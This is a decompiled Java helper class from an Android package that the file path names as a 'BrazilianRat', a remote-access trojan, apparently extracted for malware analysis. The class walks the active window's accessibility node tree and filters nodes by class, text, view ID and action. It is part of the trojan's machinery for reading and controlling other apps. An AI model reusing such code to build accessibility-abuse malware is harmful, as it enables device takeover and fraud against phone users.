package com.irifix;

import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class a {
  public static AccessibilityNodeInfo a() {
    return (AccService.a() == null) ? null : AccService.a().getRootInActiveWindow();
  }
  
  public static List<AccessibilityNodeInfo> a(AccessibilityNodeInfo.AccessibilityAction paramAccessibilityAction, List<AccessibilityNodeInfo> paramList) {
    if (paramList != null && !paramList.isEmpty()) {
      ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList();
      for (AccessibilityNodeInfo accessibilityNodeInfo : paramList) {
        if (accessibilityNodeInfo.getActionList().contains(paramAccessibilityAction))
          arrayList.add(accessibilityNodeInfo); 
      } 
      return arrayList;
    } 
    return null;
  }
  
  public static List<AccessibilityNodeInfo> a(AccessibilityNodeInfo paramAccessibilityNodeInfo) {
    ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList();
    a(paramAccessibilityNodeInfo, arrayList);
    return arrayList;
  }
  
  public static List<AccessibilityNodeInfo> a(String paramString, List<AccessibilityNodeInfo> paramList) {
    if (paramList != null && !paramList.isEmpty()) {
      ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList();
      for (AccessibilityNodeInfo accessibilityNodeInfo : paramList) {
        String str = "null";
        if (accessibilityNodeInfo.getClassName() != null)
          str = accessibilityNodeInfo.getClassName().toString(); 
        if (str.matches(paramString))
          arrayList.add(accessibilityNodeInfo); 
      } 
      return arrayList;
    } 
    return null;
  }
  
  private static void a(AccessibilityNodeInfo paramAccessibilityNodeInfo, List<AccessibilityNodeInfo> paramList) {
    if (paramAccessibilityNodeInfo != null) {
      paramList.add(paramAccessibilityNodeInfo);
      int i = paramAccessibilityNodeInfo.getChildCount();
      for (byte b = 0; b < i; b++) {
        AccessibilityNodeInfo accessibilityNodeInfo = paramAccessibilityNodeInfo.getChild(b);
        if (accessibilityNodeInfo != null)
          a(accessibilityNodeInfo, paramList); 
      } 
    } 
  }
  
  public static boolean a(List<AccessibilityNodeInfo> paramList) {
    boolean bool;
    if (paramList != null && !paramList.isEmpty()) {
      bool = true;
    } else {
      bool = false;
    } 
    return bool;
  }
  
  public static List<AccessibilityNodeInfo> b(String paramString, List<AccessibilityNodeInfo> paramList) {
    if (paramList != null && !paramList.isEmpty()) {
      ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList();
      for (AccessibilityNodeInfo accessibilityNodeInfo : paramList) {
        String str1 = "null";
        String str2 = "null";
        if (accessibilityNodeInfo.getText() != null)
          str1 = accessibilityNodeInfo.getText().toString(); 
        if (accessibilityNodeInfo.getContentDescription() != null)
          str2 = accessibilityNodeInfo.getContentDescription().toString(); 
        if (str1.toLowerCase().matches(paramString.toLowerCase()) || str2.toLowerCase().matches(paramString.toLowerCase()))
          arrayList.add(accessibilityNodeInfo); 
      } 
      return arrayList;
    } 
    return null;
  }
  
  public static List<AccessibilityNodeInfo> c(String paramString, List<AccessibilityNodeInfo> paramList) {
    if (paramList != null && !paramList.isEmpty()) {
      ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList();
      for (AccessibilityNodeInfo accessibilityNodeInfo : paramList) {
        String str = "null";
        if (accessibilityNodeInfo.getViewIdResourceName() != null)
          str = accessibilityNodeInfo.getViewIdResourceName(); 
        if (str.matches(paramString))
          arrayList.add(accessibilityNodeInfo); 
      } 
      return arrayList;
    } 
    return null;
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */